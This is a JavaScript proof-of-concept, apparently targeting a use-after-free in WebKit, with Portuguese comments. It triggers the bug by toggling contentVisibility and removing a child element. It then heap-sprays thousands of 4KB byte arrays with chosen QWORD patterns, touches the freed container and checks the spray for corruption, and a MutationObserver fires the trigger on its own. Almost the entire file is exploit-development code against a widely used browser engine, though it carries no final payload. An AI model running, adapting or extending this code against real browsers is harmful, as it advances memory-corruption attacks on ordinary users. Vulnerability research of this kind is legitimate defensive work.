// js/uaf_webkit_poc/poc.js
import { debug_log } from './module/utils.mjs';

let uafCoreLogicHasRun = false;
let sprayArraysGlobalRef = null;

// ##################################################################################
// # MODIFIQUE AQUI O PADRÃO DE SPRAY PARA CADA TESTE                               #
// # Exemplos de padrões QWORD (8 bytes, little-endian):                            #
// # const currentSprayPattern = [0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00]; // QWORD  1 - Já testado
// # const currentSprayPattern = [0x42, 0x42, 0x42, 0x42, 0x42, 0x42, 0x42, 0x42]; // QWORD 0x42... - Já testado
// # const currentSprayPattern = [0xFE, 0xBE, 0xAD, 0xDE, 0xFE, 0xBE, 0xAD, 0xDE]; // QWORD 0xDEADBEEFDEADBEEF
// # const currentSprayPattern = [0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00]; // QWORD 0 (Nulo)
   const currentSprayPattern = [0x07, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00]; // QWORD 7 (Pequeno, ímpar, possível ponteiro desalinhado/inválido)
// # const currentSprayPattern = [0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF]; // QWORD -1 (0xFF...FF)
// ##################################################################################

function heapSpray() {
  let spray = [];
  const sprayIterations = 10000; 
  
  debug_log(`Iniciando heapSpray com ${sprayIterations} iterações e padrão [${currentSprayPattern.map(b => toHex(b,8)).join(', ')}]...`);

  for (let i = 0; i < sprayIterations; i++) {
    let arr = new Uint8Array(0x1000); // 4KB
    for (let j = 0; j < arr.length; j++) {
      arr[j] = currentSprayPattern[j % currentSprayPattern.length]; 
    }
    spray.push(arr);
  }
  sprayArraysGlobalRef = spray;
  return spray;
}

function verifySprayCorruption() {
    debug_log("Iniciando verificação de corrupção do heap spray...");
    if (!sprayArraysGlobalRef || sprayArraysGlobalRef.length === 0) {
        debug_log("  Nenhum array do spray para verificar.");
        return;
    }
    let corruptedCount = 0;
    const indicesToCheck = [0, Math.floor(sprayArraysGlobalRef.length / 2), sprayArraysGlobalRef.length - 1];
    
    for (const arrayIndex of indicesToCheck) {
        if (arrayIndex < 0 || arrayIndex >= sprayArraysGlobalRef.length) continue;
        const arr = sprayArraysGlobalRef[arrayIndex];
        let isCorrupted = false;
        for (let i = 0; i < arr.length; i++) {
            if (arr[i] !== currentSprayPattern[i % currentSprayPattern.length]) { // Usa currentSprayPattern para verificação
                debug_log(`  CORRUPÇÃO DETECTADA no array do spray #${arrayIndex} no índice ${i}! Esperado: ${toHex(currentSprayPattern[i % currentSprayPattern.length], 8)}, Encontrado: ${toHex(arr[i], 8)}`);
                isCorrupted = true;
                corruptedCount++;
                break; 
            }
        }
        if (!isCorrupted) {
            debug_log(`  Array do spray #${arrayIndex} verificado, SEM corrupção aparente (padrão: [${currentSprayPattern.map(b => toHex(b,8)).join(', ')}]).`);
        }
    }

    if (corruptedCount > 0) {
        debug_log(`VERIFICAÇÃO CONCLUÍDA: ${corruptedCount} arrays do spray mostraram corrupção!`);
        document.title = "UAF: SPRAY CORROMPIDO!";
    } else {
        debug_log("VERIFICAÇÃO CONCLUÍDA: Nenhuma corrupção óbvia detectada nos arrays do spray verificados.");
    }
}

export function triggerUAF() {
  const currentContainer = document.querySelector(".container");
  if (!currentContainer) {
    debug_log("Erro Crítico: Elemento .container não encontrado para UAF."); return;
  }
  if (uafCoreLogicHasRun && document.getElementById('runUAFBtn')?.disabled) {
    debug_log("UAF já foi tentado. Recarregue a página para um novo teste completo."); return;
  }

  const currentChild = currentContainer.querySelector(".child");
  debug_log("Iniciando UAF: contentVisibility=hidden...");
  currentContainer.style.contentVisibility = "hidden";
  if (currentChild) {
    debug_log("Elemento .child encontrado, removendo-o."); currentChild.remove();
  } else {
    debug_log("Elemento .child já foi removido ou não encontrado inicialmente.");
  }

  uafCoreLogicHasRun = true; 
  const uafButton = document.getElementById('runUAFBtn');
  if(uafButton) { uafButton.disabled = true; debug_log("Botão de UAF desabilitado. Recarregue para um novo teste completo."); }

  setTimeout(() => {
    debug_log("setTimeout: contentVisibility=auto, heapSpray()...");
    if (document.body.contains(currentContainer)) {
        currentContainer.style.contentVisibility = "auto";
    } else {
        debug_log("Container foi removido do DOM antes de contentVisibility='auto'."); return;
    }
    
    heapSpray(); 
    debug_log(`Heap spray realizado com ${sprayArraysGlobalRef ? sprayArraysGlobalRef.length : 0} arrays.`);
    debug_log("Heap spray concluído.");
    
    debug_log("Tentando interação MÍNIMA com o container pós-spray...");
    try {
        debug_log("  Lendo currentContainer.offsetHeight...");
        let h = currentContainer.offsetHeight; 
        debug_log(`  currentContainer.offsetHeight lido: ${h}.`);
        debug_log("  Definindo currentContainer.setAttribute('data-uaf-test', 'hit')...");
        currentContainer.setAttribute('data-uaf-test', 'hit');
        if (currentContainer.getAttribute('data-uaf-test') === 'hit') {
            debug_log("  Atributo 'data-uaf-test' definido e verificado com sucesso.");
        } else {
            debug_log("  FALHA ao definir/verificar atributo 'data-uaf-test'.");
        }
        debug_log("Interação MÍNIMA com o container concluída SEM ERRO JAVASCRIPT.");
    } catch (e) {
        debug_log(`ERRO JAVASCRIPT durante interação mínima com container: ${e.name} - ${e.message}`);
    }
    debug_log("Fim da lógica do setTimeout principal.");
    debug_log("Agendando verificação de corrupção do spray para daqui a 1 segundo...");
    setTimeout(verifySprayCorruption, 1000);
  }, 0); 
}

// Configuração do MutationObserver (continua one-shot)
const initialContainerForObserver = document.querySelector(".container");
if (initialContainerForObserver) {
    const observer = new MutationObserver((mutationsList, obs) => {
      if (!uafCoreLogicHasRun) { 
        debug_log("MutationObserver: DOM tree modified, chamando triggerUAF...");
        triggerUAF();
        obs.disconnect(); 
        debug_log("MutationObserver desconectado.");
      } else {
        obs.disconnect(); 
      }
    });
    observer.observe(initialContainerForObserver, { childList: true, subtree: true });
} else {
    console.warn("Elemento .container inicial não encontrado para MutationObserver no UAF PoC.");
}
